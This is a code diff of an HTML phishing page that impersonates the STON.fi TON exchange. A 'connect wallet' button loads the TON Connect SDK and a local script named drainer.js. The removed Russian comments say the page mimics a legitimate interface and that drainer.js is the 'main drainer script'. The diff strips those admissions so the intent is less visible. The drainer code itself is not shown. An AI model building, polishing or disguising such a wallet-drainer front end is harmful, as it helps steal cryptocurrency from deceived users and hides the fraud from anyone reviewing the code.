@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>STON.fi — обменник</title>
     <style>
-        /* Минималистичный стиль под легитимный интерфейс */
         body {
             font-family: 'Segoe UI', sans-serif;
             background: #0b0e11;
@@ -22,18 +21,9 @@
             border-radius: 20px;
             text-align: center;
             max-width: 400px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
         }
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
-            color: #00a3ff;
-            margin-bottom: 10px;
-        }
-        .sub {
-            color: #8b95a0;
-            margin-bottom: 30px;
-        }
+        .logo { font-size: 28px; font-weight: 700; color: #00a3ff; }
+        .sub { color: #8b95a0; margin: 10px 0 30px; }
         .btn {
             background: #00a3ff;
             border: none;
@@ -43,25 +33,11 @@
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
         }
-        .btn:hover {
-            background: #0090e0;
-        }
-        .btn:disabled {
-            opacity: 0.5;
-            pointer-events: none;
-        }
-        #status {
-            margin-top: 20px;
-            color: #f0b90b;
-            font-size: 14px;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #5e6a76;
-        }
+        .btn:hover { background: #0090e0; }
+        .btn:disabled { opacity: 0.5; pointer-events: none; }
+        #status { margin-top: 20px; color: #f0b90b; font-size: 14px; }
+        #debug { margin-top: 15px; font-size: 12px; color: #5e6a76; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -70,13 +46,12 @@
         <div class="sub">Децентрализованный обменник</div>
         <button id="connectBtn" class="btn">Подключить кошелёк</button>
         <div id="status">Готов к подключению</div>
-        <div class="footer">Работает на TON</div>
+        <div id="debug"></div>
     </div>
 
-    <!-- Загрузка TON Connect SDK с CDN -->
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    <!-- Основной скрипт дрэйнера -->
+    <!-- Используем актуальную сборку TON Connect SDK с jsdelivr -->
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@2.1.0/dist/tonconnect-sdk.min.js"></script>
+    <!-- Основной скрипт -->
     <script src="drainer.js"></script>
 </body>
 </html>
